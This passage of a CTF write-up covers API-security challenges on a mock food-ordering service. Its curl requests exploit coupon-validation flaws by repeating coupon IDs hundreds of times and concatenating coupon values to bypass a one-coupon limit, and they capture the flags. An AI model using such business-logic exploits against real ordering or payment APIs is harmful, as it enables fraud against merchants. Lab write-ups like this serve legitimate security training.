curl -X POST -s https://uber-orc-1.chals.ctf.malteksolutions.com/restaurant/2/order -H "Content-Type: application/json" -d '{"Time":20,"Menu_Items":"5","Coupons":"3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3"}'
```

![](did-someone-order-a-flag-6.png)

Flag: {p3rh4ps_y0u_sh0uld_c0ns1d3r_4_w4ll3t}

## This is Why We Can't Have Nice Things

### Points: 150

*I did not receive points for this challenge as it was solved after the competition concluded.*

Apparently _someone_ found a way to abuse the coupon system. Now we're limited to one coupon per customer. Thanks a lot, jerks. Target URL: [https://uber-orc-2.chals.ctf.malteksolutions.com/](https://uber-orc-2.chals.ctf.malteksolutions.com/)

Looking at all the different restaurants menus, we see that there a `Flag` item.

```
curl -X GET https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/menu -s | jq
```

![](this-is-why-we-cant-have-nice-things-1.png)

After looking through all the coupons, we see that hour 12 has the $2 coupon.

```
curl -X GET https://uber-orc-2.chals.ctf.malteksolutions.com/coupons/12 -s | jq
```

![](this-is-why-we-cant-have-nice-things-2.png)

When using the coupon, we see that the total deceases by $2.

```
curl -X POST -s https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/order -H "Content-Type: application/json" -d '{"Time":12,"Menu_Items":"7","Coupon":"2"}' | jq
```

![](this-is-why-we-cant-have-nice-things-3.png)

However, when trying to add comma and another 2 in the `Coupon` parameter, we receive an error message.

```
curl -X POST -s https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/order -H "Content-Type: application/json" -d '{"Time":12,"Menu_Items":"7","Coupon":"2,2"}' | jq
```

![](this-is-why-we-cant-have-nice-things-4.png)

Removing the comma, we see that $4 gets removed from the total, resulting in an improper check on the backend.

```
curl -X POST -s https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/order -H "Content-Type: application/json" -d '{"Time":12,"Menu_Items":"7","Coupon":"22"}' | jq
```

![](this-is-why-we-cant-have-nice-things-5.png)

Sending 500 2's in the `Coupon` parameter, we can retrieve the flag.

```
curl -X POST -s https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/order -H "Content-Type: application/json" -d '{"Time":12,"Menu_Items":"7","Coupon":"22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222"}' | jq
```

![](this-is-why-we-cant-have-nice-things-6.png)

Flag: apisec{t0o_ManY_c0UpoN5}

---

# Let's Begin

## Were You Paying Attention?

### Points: 25

This challenge is to make sure you understand what's going on, how things work, and where to find help. The flag is the name of the Discord channel where you can reach out in case you run into any problems. All the information is provided in the Competition Info section of the scoreboard.

Submit the flag as `apisec{name-of-channel}`.

_NOTE:_ THE FORMAT OF ALL FLAGS FOR THE EVENT WILL FOLLOW THE SAME STRUCTURE!

In the rules, there is information about the Discord. Joining the discord, we see there is the channel `apisec-con-ctf`.

Flag: apisec{apisec-con-ctf}